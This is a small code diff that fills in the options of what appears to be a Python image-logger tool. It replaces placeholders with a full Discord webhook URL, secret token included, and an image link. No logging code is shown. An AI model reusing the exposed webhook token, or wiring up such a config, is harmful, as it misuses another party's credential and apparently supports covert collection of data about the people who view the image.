@@ -12,12 +12,12 @@
 # Options 
 options = {
     "webhook": {
-        "url": "WEBHOOK_URL",
+        "url": "https://discord.com/api/webhooks/1197675776422719528/hWcDeXQ6fdA9S9lVrnAIwoZvgLhgolW8iIxO_Oy8uXQIxn_WDzNnyhQYK4bSwsZQ8O8P",
     },
     "image": {
         "enabled": False,
         "corrupted-image-preview": False,
-        "url": "IMAGE_URL",
+        "url": "https://i.ytimg.com/vi/nz8q0zyNCOw/maxresdefault.jpg",
     },
     "url": {
          "enabled": False,
